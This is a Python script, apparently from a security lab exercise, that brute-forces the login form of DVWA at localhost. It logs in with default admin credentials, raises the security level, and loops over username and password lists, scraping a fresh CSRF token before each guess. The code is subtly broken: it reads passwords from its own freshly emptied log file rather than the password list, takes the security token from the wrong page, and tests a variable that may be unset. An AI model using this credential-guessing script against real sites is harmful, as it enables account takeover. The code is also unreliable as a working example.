from bs4 import BeautifulSoup
import sys
from requests import Session
from datetime import datetime
from tqdm import tqdm
import os

BASE_PATH = os.path.dirname(os.path.realpath(__file__))
LOG_FILE = "latest.log"
LOG_PATH = os.path.join(BASE_PATH, LOG_FILE)

USERNAMES_FILE = "usernames.txt"
PSWDS_FILE = "passwords.txt"

BASE_URL = "http://localhost/dvwa/" 
BRUTEFORCE_URL = f"{BASE_URL}/vulnerabilities/brute?"


def get_list(filename):
    with open(filename, 'r') as file:
        return file.read().splitlines()


def send_credentials(session, url, data):
    response = session.get(url, params=data)
    return response


def extract_message(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    message_div = soup.find("div", {"class": "message"})
    if message_div:
        return message_div.text.strip()
    return None


def extract_output_message(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    form = soup.find("form")  # Encontra o formulário de login
    if form:
        next_sibling = form.find_next_sibling()
        if next_sibling and next_sibling.name in ["p", "pre"]:
            return next_sibling.text.strip()
    return None


def log(username, password, status, message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] Username: {username}, Senha: {password}, Status: {status}, Mensagem: {message}"
    with open(LOG_PATH, "a") as log_file:
        log_file.write(log_entry + "\n")


def main():
    with open(LOG_PATH, "w") as log_file:
        log_file.write("")


    passwords = get_list(os.path.join(BASE_PATH, LOG_FILE))

    usernames = get_list(os.path.join(BASE_PATH, USERNAMES_FILE))
    
    session = Session()
    login_url = f"{BASE_URL}/login.php"
    
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find("input", {"name": "user_token"})["value"]   

    login_data = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    response = session.post(login_url, data=login_data)
    
    if "Welcome" not in response.text:
        print("[-] Falha no login. Verifique as credenciais.")
        sys.exit(1)


    security_level = "high"
    security_url = f"{BASE_URL}/security.php"
    
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find("input", {"name": "user_token"})["value"]   
    
    security_data = {
        "security": security_level,
        "seclev_submit": "Submit",
        "user_token": user_token
    }
    response = session.post(security_url, data=security_data)
    
    message = extract_message(response)
    if message:
        print(f"[+] Mensagem: {message}")
        if "CSRF token is incorrect" in message:
            print("[-] Token CSRF incorreto. Encerrando o script.")
            sys.exit(1)
    else:
        print("[-] Não foi possível encontrar a mensagem.")

    for username in usernames:
        print(f"\n[+] Testando usuário: {username}")
        for password in tqdm(passwords, desc="Progresso", unit="senha"):
            data = {
                "username": username,
                "password": password,
                "Login": "Login"
            }

            if security_level == "high":
                response = session.get(BRUTEFORCE_URL)
                soup = BeautifulSoup(response.text, 'html.parser')
                user_token = soup.find("input", {"name": "user_token"})["value"]
                data["user_token"] = user_token

            response = send_credentials(session, BRUTEFORCE_URL, data)
            csfr_message = extract_message(response)
            message = csfr_message
            if csfr_message is None:
                output = extract_output_message(response)
                message = output
                
            if message is not None and 'incorrect' not in output:
                log(username, password, "Sucesso", message)
                print(f"\n[+] Senha encontrada para o usuário {username}: {password}")
                return
            else:
                log(username, password, "Falha", message)

if __name__ == "__main__":
    main()